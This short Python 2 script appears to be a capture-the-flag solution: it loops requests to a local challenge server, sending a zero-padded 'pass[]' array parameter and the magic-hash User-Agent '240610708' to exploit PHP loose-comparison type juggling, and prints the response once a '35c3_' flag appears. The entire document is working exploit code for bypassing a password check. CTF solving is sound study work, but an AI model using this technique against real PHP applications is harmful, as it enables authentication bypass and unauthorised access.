import requests

for x in xrange(50):
    resp = requests.get('http://0:1333/?pass[]=' + '0'*x, headers={'User-Agent': '240610708'})
    if '35c3_' in resp.content: print resp.content, x; break
